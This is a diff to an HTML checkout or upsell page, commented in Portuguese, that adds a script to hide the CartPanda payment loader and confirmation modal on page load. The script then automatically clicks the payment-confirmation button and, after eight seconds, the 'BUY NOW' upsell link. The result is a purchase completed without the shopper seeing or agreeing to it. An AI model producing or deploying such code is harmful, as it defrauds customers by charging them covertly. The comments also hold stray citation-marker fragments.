@@ -14,50 +14,67 @@
                 </script>
             
 	<script>
-	  document.addEventListener('DOMContentLoaded', () => {
-		// 1) CSS global para manter todo modal invisível
-		const style = document.createElement('style');
-		style.innerHTML = `
-		  /* esconde qualquer modal da CartPanda */
-		  #cartpandaModal,
-		  .cartpanda-modal {
-			display: none !important;
-			visibility: hidden !important;
-			opacity: 0 !important;
-			pointer-events: none !important;
-		  }
-		`;
-		document.head.appendChild(style);
+	document.addEventListener('DOMContentLoaded', () => {
+	  // 1) Esconde loader e modal à força
+	  const style = document.createElement('style');
+	  style.innerHTML = `
+		/* Esconde o loader externo */  
+		#cartpanda-loader-container { display: none !important; visibility: hidden !important; opacity: 0 !important; }
+		/* Esconde o modal externo */  
+		#cartpanda-modal-container, .cartpanda-modal { display: none !important; visibility: hidden !important; opacity: 0 !important; }
+	  `;
+	  document.head.appendChild(style);
 
-		// 2) Observer para detectar quando o modal é de fato inserido no body
-		const observer = new MutationObserver((mutations) => {
-		  for (const { addedNodes } of mutations) {
-			for (const node of addedNodes) {
-			  if (!(node instanceof HTMLElement)) continue;
-			  if (node.id === 'cartpandaModal' || node.classList.contains('cartpanda-modal')) {
-				// achou o modal (conforme id e classe do pop-up) :contentReference[oaicite:0]{index=0}
-				// busca o botão de confirmação
-				const confirmBtn = node.querySelector('#cartpanda-payment-confirmation');
-				if (confirmBtn) {
-				  // clica para finalizar a compra automaticamente
-				  confirmBtn.click();
-				  observer.disconnect();
-				}
-			  }
+	  // 2) Função genérica que tenta clicar no botão de confirmação
+	  function tryConfirm() {
+		// a) botão direto no parent (caso o modal seja injetado sem iframe)
+		let btn = document.querySelector('#cartpanda-payment-confirmation');
+		if (btn) { btn.click(); return true; }
+
+		// b) botão dentro do container (se for injetado via innerHTML no parent) :contentReference[oaicite:0]{index=0}
+		const modalCont = document.getElementById('cartpanda-modal-container');
+		if (modalCont) {
+		  btn = modalCont.querySelector('#cartpanda-payment-confirmation');
+		  if (btn) { btn.click(); return true; }
+		}
+
+		return false;
+	  }
+
+	  // 3) Observa o container principal para clicar assim que o HTML do modal for injetado
+	  const modalContainer = document.getElementById('cartpanda-modal-container');
+	  if (modalContainer) {
+		new MutationObserver((mutations, obs) => {
+		  if (tryConfirm()) obs.disconnect();
+		}).observe(modalContainer, { childList: true, subtree: true });
+	  }
+
+	  // 4) Observa todo o body para capturar também possíveis <iframe> (caso o conteúdo venha via iframe) :contentReference[oaicite:1]{index=1}
+	  new MutationObserver((mutations, obs) => {
+		for (const m of mutations) {
+		  for (const node of m.addedNodes) {
+			if (node.tagName === 'IFRAME') {
+			  node.addEventListener('load', () => {
+				tryConfirm();
+				obs.disconnect();
+			  });
+			  return;
 			}
 		  }
-		});
-		observer.observe(document.body, { childList: true, subtree: true });
+		}
+	  }).observe(document.body, { childList: true, subtree: true });
 
-		// 3) Após 8 segundos, dispara o clique no link “BUY NOW” (accepted=yes) :contentReference[oaicite:1]{index=1}
-		setTimeout(() => {
-		  const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		  if (!buyLink) {
-			return console.warn('Auto-upsell: link BUY NOW não encontrado');
-		  }
-		  buyLink.click();
-		}, 8000);
-	  });
+	  // 5) Dispara o clique no “BUY NOW” passado 8s
+	  setTimeout(() => {
+		const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
+		if (!buyLink) {
+		  return console.warn('Auto-upsell: botão BUY NOW não encontrado');
+		}
+		buyLink.click();
+		// caso o modal seja injetado instantaneamente, tenta confirmar logo após
+		setTimeout(tryConfirm, 500);
+	  }, 8000);
+	});
 	</script>
 
   <style>
